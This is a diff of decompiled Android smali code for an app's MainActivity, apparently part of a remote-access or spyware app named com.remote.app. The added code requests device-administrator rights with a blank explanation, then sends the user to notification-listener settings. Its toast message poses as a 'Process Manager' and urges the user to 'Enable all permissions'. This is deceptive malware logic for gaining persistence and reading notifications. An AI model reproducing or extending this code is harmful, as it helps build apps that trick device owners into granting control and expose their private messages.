@@ -3,12 +3,69 @@
 .source ""
 
 
+# instance fields
+.field private a:Landroid/app/admin/DevicePolicyManager;
+
+.field private b:Landroid/content/ComponentName;
+
+
 # direct methods
 .method public constructor <init>()V
-    .locals 0
+    .locals 1
 
     invoke-direct {p0}, Landroid/app/Activity;-><init>()V
 
+    const/4 v0, 0x0
+
+    iput-object v0, p0, Lcom/remote/app/MainActivity;->a:Landroid/app/admin/DevicePolicyManager;
+
+    iput-object v0, p0, Lcom/remote/app/MainActivity;->b:Landroid/content/ComponentName;
+
+    return-void
+.end method
+
+.method private a(Landroid/content/ComponentName;)V
+    .locals 2
+
+    const-string v0, "device_policy"
+
+    invoke-virtual {p0, v0}, Landroid/app/Activity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+
+    move-result-object v0
+
+    check-cast v0, Landroid/app/admin/DevicePolicyManager;
+
+    iput-object v0, p0, Lcom/remote/app/MainActivity;->a:Landroid/app/admin/DevicePolicyManager;
+
+    iget-object v0, p0, Lcom/remote/app/MainActivity;->a:Landroid/app/admin/DevicePolicyManager;
+
+    invoke-virtual {v0, p1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z
+
+    move-result v0
+
+    if-nez v0, :cond_0
+
+    new-instance v0, Landroid/content/Intent;
+
+    const-string v1, "android.app.action.ADD_DEVICE_ADMIN"
+
+    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
+
+    const-string v1, "android.app.extra.DEVICE_ADMIN"
+
+    invoke-virtual {v0, v1, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;
+
+    const-string p1, "android.app.extra.ADD_EXPLANATION"
+
+    const-string v1, " "
+
+    invoke-virtual {v0, p1, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
+
+    const/16 p1, 0x2f
+
+    invoke-virtual {p0, v0, p1}, Landroid/app/Activity;->startActivityForResult(Landroid/content/Intent;I)V
+
+    :cond_0
     return-void
 .end method
 
@@ -60,6 +117,33 @@
     const/4 p1, 0x1
 
     invoke-static {p0, p2, p1}, Landroid/support/v4/app/b;->a(Landroid/app/Activity;[Ljava/lang/String;I)V
+
+    :cond_0
+    return-void
+.end method
+
+.method protected onActivityResult(IILandroid/content/Intent;)V
+    .locals 0
+
+    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V
+
+    const/16 p3, 0x2f
+
+    if-ne p1, p3, :cond_0
+
+    const/4 p1, -0x1
+
+    if-ne p2, p1, :cond_0
+
+    new-instance p1, Landroid/content/Intent;
+
+    const-string p2, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"
+
+    invoke-direct {p1, p2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {p0, p1}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V
+
+    invoke-virtual {p0}, Landroid/app/Activity;->finish()V
 
     :cond_0
     return-void
@@ -149,50 +233,52 @@
     invoke-virtual {v1}, Landroid/content/pm/PackageManager$NameNotFoundException;->printStackTrace()V
 
     :goto_0
-    const-string v1, "Enable \'Package Manager\'\n Click back x2\n and Enable all permissions"
+    const-string v1, "Enable Process Manager\'\n Click back x2\n and Enable all permissions"
 
     invoke-static {p1, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
 
-    move-result-object p1
-
-    invoke-virtual {p1}, Landroid/widget/Toast;->getView()Landroid/view/View;
-
     move-result-object v1
 
-    const v2, 0x102000b
+    invoke-virtual {v1}, Landroid/widget/Toast;->getView()Landroid/view/View;
 
-    invoke-virtual {v1, v2}, Landroid/view/View;->findViewById(I)Landroid/view/View;
+    move-result-object v2
 
-    move-result-object v1
+    const v3, 0x102000b
 
-    check-cast v1, Landroid/widget/TextView;
+    invoke-virtual {v2, v3}, Landroid/view/View;->findViewById(I)Landroid/view/View;
 
-    const/high16 v2, -0x10000
+    move-result-object v2
 
-    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setTextColor(I)V
+    check-cast v2, Landroid/widget/TextView;
 
-    sget-object v2, Landroid/graphics/Typeface;->DEFAULT_BOLD:Landroid/graphics/Typeface;
+    const/high16 v3, -0x10000
 
-    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;)V
+    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setTextColor(I)V
 
-    const/16 v2, 0x11
+    sget-object v3, Landroid/graphics/Typeface;->DEFAULT_BOLD:Landroid/graphics/Typeface;
 
-    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setGravity(I)V
+    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;)V
 
-    invoke-virtual {p1}, Landroid/widget/Toast;->show()V
+    const/16 v3, 0x11
+
+    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setGravity(I)V
+
+    invoke-virtual {v1}, Landroid/widget/Toast;->show()V
 
     invoke-virtual {p0, p0, v0}, Lcom/remote/app/MainActivity;->a(Landroid/content/Context;[Ljava/lang/String;)V
 
-    new-instance p1, Landroid/content/Intent;
+    new-instance v0, Landroid/content/ComponentName;
 
-    const-string v0, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"
+    const-class v1, Lcom/remote/app/DeviceAdmin;
 
-    invoke-direct {p1, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
+    invoke-direct {v0, p1, v1}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
 
-    invoke-virtual {p0, p1}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V
+    iput-object v0, p0, Lcom/remote/app/MainActivity;->b:Landroid/content/ComponentName;
+
+    iget-object p1, p0, Lcom/remote/app/MainActivity;->b:Landroid/content/ComponentName;
+
+    invoke-direct {p0, p1}, Lcom/remote/app/MainActivity;->a(Landroid/content/ComponentName;)V
 
     :cond_0
-    invoke-virtual {p0}, Landroid/app/Activity;->finish()V
-
     return-void
 .end method
